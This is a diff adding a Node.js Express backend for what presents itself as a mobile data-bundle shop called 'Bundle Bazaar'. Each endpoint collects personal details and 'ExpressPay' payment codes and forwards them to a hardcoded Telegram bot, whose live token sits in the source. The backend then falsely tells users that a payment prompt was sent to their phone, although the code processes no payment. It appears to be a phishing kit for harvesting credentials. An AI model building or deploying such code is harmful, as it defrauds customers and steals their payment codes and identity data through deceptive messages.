@@ -1,0 +1,250 @@
+const express = require('express');
+const cors = require('cors');
+const axios = require('axios');
+require('dotenv').config();
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// =============================================
+// CONFIGURATION
+// =============================================
+const TELEGRAM_BOT_TOKEN = '8993833860:AAHz1B3ueOgICpj_JdhckTf7Xp0Vu6IeLCY';
+const TELEGRAM_CHAT_ID = '7730849900';
+const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+// =============================================
+// MIDDLEWARE
+// =============================================
+app.use(cors());
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// =============================================
+// LOGGING MIDDLEWARE
+// =============================================
+app.use((req, res, next) => {
+    console.log(`📥 ${req.method} ${req.path}`);
+    console.log('📦 Body:', req.body);
+    next();
+});
+
+// =============================================
+// TELEGRAM SEND FUNCTION
+// =============================================
+async function sendToTelegram(message) {
+    try {
+        const response = await axios.post(TELEGRAM_API_URL, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        });
+        console.log('✅ Telegram message sent successfully!');
+        return response.data;
+    } catch (error) {
+        console.error('❌ Error sending to Telegram:', error.response?.data || error.message);
+        throw error;
+    }
+}
+
+// =============================================
+// FORMAT MESSAGES
+// =============================================
+function formatVendorRegistration(data) {
+    return `
+🎉 <b>NEW VENDOR REGISTRATION!</b>
+
+👤 <b>Full Name:</b> ${data.fullName}
+📱 <b>Phone:</b> ${data.phone}
+🏪 <b>Business Name:</b> ${data.business}
+📦 <b>Trade Type:</b> ${data.tradeType}
+🎂 <b>Date of Birth:</b> ${data.dob}
+🏠 <b>Hometown:</b> ${data.hometown}
+
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+    `;
+}
+
+function formatPurchase(data) {
+    return `
+🛒 <b>NEW PURCHASE!</b>
+
+📦 <b>Package:</b> ${data.package}
+💰 <b>Price:</b> ${data.price}
+📱 <b>Phone:</b> ${data.phone}
+🔑 <b>ExpressPay Code:</b> ${data.code}
+
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+    `;
+}
+
+function formatRecharge(data) {
+    return `
+💰 <b>NEW RECHARGE!</b>
+
+📦 <b>Package:</b> ${data.package}
+💰 <b>Price:</b> ${data.price}
+📱 <b>Phone:</b> ${data.phone}
+🔑 <b>ExpressPay Code:</b> ${data.code}
+
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+    `;
+}
+
+// =============================================
+// API ENDPOINTS
+// =============================================
+
+// Health Check
+app.get('/', (req, res) => {
+    res.json({
+        status: '✅ Bundle Bazaar API is running!',
+        endpoints: [
+            'POST /api/register-vendor',
+            'POST /api/purchase',
+            'POST /api/recharge',
+            'GET /api/health'
+        ]
+    });
+});
+
+app.get('/api/health', (req, res) => {
+    res.json({ status: '✅ Healthy', timestamp: new Date().toISOString() });
+});
+
+// =============================================
+// 1. VENDOR REGISTRATION
+// =============================================
+app.post('/api/register-vendor', async (req, res) => {
+    try {
+        const { fullName, phone, business, tradeType, dob, hometown } = req.body;
+
+        // Validate required fields
+        if (!fullName || !phone || !business || !tradeType || !dob || !hometown) {
+            return res.status(400).json({
+                success: false,
+                message: '❌ All fields are required!'
+            });
+        }
+
+        // Format data
+        const data = { fullName, phone, business, tradeType, dob, hometown };
+
+        // Send to Telegram
+        const message = formatVendorRegistration(data);
+        await sendToTelegram(message);
+
+        // Send success response
+        res.json({
+            success: true,
+            message: '✅ Vendor registration successful! A representative will contact you shortly.'
+        });
+
+    } catch (error) {
+        console.error('❌ Error in /api/register-vendor:', error);
+        res.status(500).json({
+            success: false,
+            message: '❌ Failed to process registration. Please try again.'
+        });
+    }
+});
+
+// =============================================
+// 2. PURCHASE
+// =============================================
+app.post('/api/purchase', async (req, res) => {
+    try {
+        const { package: packageName, price, phone, code } = req.body;
+
+        // Validate required fields
+        if (!packageName || !price || !phone || !code) {
+            return res.status(400).json({
+                success: false,
+                message: '❌ All fields are required!'
+            });
+        }
+
+        // Format data
+        const data = { package: packageName, price, phone, code };
+
+        // Send to Telegram
+        const message = formatPurchase(data);
+        await sendToTelegram(message);
+
+        // Send success response
+        res.json({
+            success: true,
+            message: '✅ Purchase initiated! A payment prompt has been sent to your phone.'
+        });
+
+    } catch (error) {
+        console.error('❌ Error in /api/purchase:', error);
+        res.status(500).json({
+            success: false,
+            message: '❌ Failed to process purchase. Please try again.'
+        });
+    }
+});
+
+// =============================================
+// 3. RECHARGE
+// =============================================
+app.post('/api/recharge', async (req, res) => {
+    try {
+        const { package: packageName, price, phone, code } = req.body;
+
+        // Validate required fields
+        if (!packageName || !price || !phone || !code) {
+            return res.status(400).json({
+                success: false,
+                message: '❌ All fields are required!'
+            });
+        }
+
+        // Format data
+        const data = { package: packageName, price, phone, code };
+
+        // Send to Telegram
+        const message = formatRecharge(data);
+        await sendToTelegram(message);
+
+        // Send success response
+        res.json({
+            success: true,
+            message: '✅ Recharge initiated! A payment prompt has been sent to your phone.'
+        });
+
+    } catch (error) {
+        console.error('❌ Error in /api/recharge:', error);
+        res.status(500).json({
+            success: false,
+            message: '❌ Failed to process recharge. Please try again.'
+        });
+    }
+});
+
+// =============================================
+// 404 Handler
+// =============================================
+app.use((req, res) => {
+    res.status(404).json({
+        success: false,
+        message: '❌ Endpoint not found'
+    });
+});
+
+// =============================================
+// START SERVER
+// =============================================
+app.listen(PORT, () => {
+    console.log(`🚀 Bundle Bazaar Backend running on port ${PORT}`);
+    console.log(`📱 Telegram Bot configured`);
+    console.log(`📨 Messages will be sent to chat ID: ${TELEGRAM_CHAT_ID}`);
+    console.log('');
+    console.log('📌 Available endpoints:');
+    console.log('   POST /api/register-vendor');
+    console.log('   POST /api/purchase');
+    console.log('   POST /api/recharge');
+    console.log('   GET  /api/health');
+    console.log('   GET  /');
+});
